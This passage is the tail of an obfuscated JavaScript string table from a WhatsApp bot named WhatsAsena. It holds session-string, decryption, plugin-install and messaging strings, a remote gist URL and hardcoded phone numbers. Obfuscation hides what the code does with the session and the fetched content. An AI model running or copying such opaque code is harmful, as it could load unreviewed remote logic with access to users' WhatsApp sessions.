app.net','919074309534,0','VERSION','Version:','user','{pp}','splice','🛡️\x20Blacklist\x20Detected\x20🛡️','patch','statusCode','BOT\x20RUNNING\x20ON\x20OUR\x20DEVICE\x20✅','map','```🛡️\x20Blacklist\x20Tespit\x20Edildi!```\x20\x0a```Kullanıcı:```\x20\x0a```Sebep:```\x20','fromMe','indexOf','GIF_BYE','\x0a_Bu\x20mesaj\x20sizin\x20numaranıza\x20(kaydedilen\x20mesajlar)\x20gitmiş\x20olmalıdır._\x0a\x0a','open','ℹ️\x20Connecting\x20to\x20WhatsApp...','{gpdesc}','905511384572,0','WhatsAsena','PluginDB','jid','format','StringSession','Wrong\x20WORK_TYPE\x20key!\x20Please\x20use\x20“private”\x20or\x20“public”','text','81333vNSDvR','writeFileSync','image','917012074386-1631435717','./plugins/sql/plugin','onlyPinned','*Bot\x20Started*','DATABASE','get','pin','\x0a\x0a*🧞‍♂️\x20','*~_________~\x20ERROR\x20REPORT\x20~______~*','chats','onlyGroup','```🛡️\x20Blacklist\x20Detected!```\x20\x0a```User:```\x20\x20\x0a```Reason:```\x20','SUPPORT','readdirSync','./plugins/sql/greetings','SUPPORT2','axios','Whats','gif','SESSION','function','remoteJid','arraybuffer','from','{gphead}','message','remove','sendMessage','italic','{owner}','SUDO','owner','connect','10145542hBurxl','blue','12523MNaAAd','status@broadcast','SUPPORT3','STRING','version','split','DEBUG','path','WEL_GIF','createStringSession','private','https://gist.githubusercontent.com/souravkl11/ff107d59b17f1e4b96889a82dbb6d520/raw','/formation','length','body','groupMetadata','\x0a*WhatsAsena\x20bir\x20hata\x20gerçekleşti!*','2876160TmDKkh','sequelize','includes','sync','⬇️Installing\x20plugins...','BLOCKCHAT','905511384572-1625319286','name','then','deCrypt','log','key','blueBright','bold','public','define','dataValues','12OuOvVH','./plugins/sql/'];_0x32b9=function(){return _0x4e9abc;};return _0x32b9();}whatsAsena();
